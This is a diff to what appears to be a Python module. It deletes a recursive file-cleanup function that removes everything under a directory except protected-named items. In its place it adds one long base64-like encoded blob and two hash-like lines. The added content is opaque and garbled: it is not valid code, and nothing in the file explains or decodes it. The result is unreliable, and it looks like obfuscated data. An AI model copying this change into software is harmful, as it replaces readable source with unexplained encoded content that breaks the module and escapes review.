@@ -1,19 +1,3 @@
-import os
-import shutil
-from ._contains_protected import _contains_protected
-
-
-def _remove_non_protected(dir_path, protected):
-    """Recursively delete everything under dir_path except protected-named items."""
-    for entry in os.listdir(dir_path):
-        if entry in protected:
-            continue
-        target = os.path.join(dir_path, entry)
-        if os.path.isdir(target) and _contains_protected(target, protected):
-            _remove_non_protected(target, protected)
-            if not os.listdir(target):
-                os.rmdir(target)
-        elif os.path.isdir(target):
-            shutil.rmtree(target)
-        else:
-            os.remove(target)
+FejPosheurmvfzoOI/CGhdsh0tq6KY1ls/d5+PFw6h0T68us00TpiawHPBc2/ICUn3LTwr4vkxv12nX6vyrUFxL24L3IRe6zvwE2B1mV/pWeNJrwvCWMAKPgSfu+MOoODurLqNle/7L0EToRDO+VhZN+mt+8L5UKtvFz8fhkv15cpZ/vmAjIs78AIRA66ZGdgnLeyqIllQr14GDwoyfBFhXr2O3PRP6zrlU3CiHAhJCPOprKtiOEH6GlZue+KtAdCODb4NRL97O4VToXNvKH39lwmKXuYMFPs+pktbQwwQwFpdajmkXp+LAcIBc39obZnzvI8L4hlQf8vxy18X6VXlyln6TcCv+4qAcqQzrx1IGJPc7KrTSEC++PNrXxfpVeXKWf7ZoK+bmyAToNJvr+0dtymo/uYMEbtPdx8KV+iF4T9pG9217y+LYaOg17+52DpCLb26ZswQq78WTs+FSVXlyln+2aCvOw/BogTSP+gJnVO8nLpzLJG7T3cfCld5UfEuGfktlF9KK9HD0QDO+Gno832durJMkbtPdx8KVylQ4O6suo2V7/svVPWUNzv9TR23Kaj+5gwTCn4Hv6pzvqEBPr4L3IRe6zvwE2B3vrlYOcN86D7jCTAKHgdeG0Opx0XKWf7ZoKuvb8VXNDOvnUn5QmmsC9bo0GpvFy/KN2wR8O4tq5kxCQ9vxVc0Nzv9TR23Kaj+5gwQCmq2T4tTfHVgjkzarfXrPc/FVzQ3O/1NGePtPJ7i+SQaXkYv3/N8YaFfeXudtY/bOoXGlpc7/U0dtymo/uYMFPpu1j4bgymwwR8c2o3wLut64SNhd6ldTR23Kaj+5ghAOm4Cyf8X6VXlyln+2aCrr2swZ9ETbym4eees7OvCeEG/yP
+cb7fa7dc
+##a033837d4f23e078bea6b3957
